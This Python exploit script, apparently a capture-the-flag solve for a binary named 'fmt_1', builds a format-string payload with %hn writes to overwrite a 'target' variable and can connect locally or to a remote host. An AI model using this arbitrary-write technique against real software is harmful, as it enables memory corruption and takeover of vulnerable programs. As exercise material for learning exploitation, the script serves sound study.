#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./fmt_1', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*vuln+114
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    goal = 0x6F726568
    target = exe.sym["target"]

    payload = f'%{goal & 0xffff}c%23$hn'.encode()
    payload += f'%{(goal >> 16) - (goal & 0xffff)}c%24$hn'.encode()
    payload = payload.ljust(0x20, b'.')
    payload += p32(target)
    payload += p32(target + 2)

    # offset = 15
    # write = {
    #     exe.sym["target"]: 0x6F726568
    # }

    # payload = fmtstr_payload(offset, write, write_size='short')

    # print(payload)

    ru(b'say?')
    sl(payload)


    interactive()

if __name__ == '__main__':
  exploit()
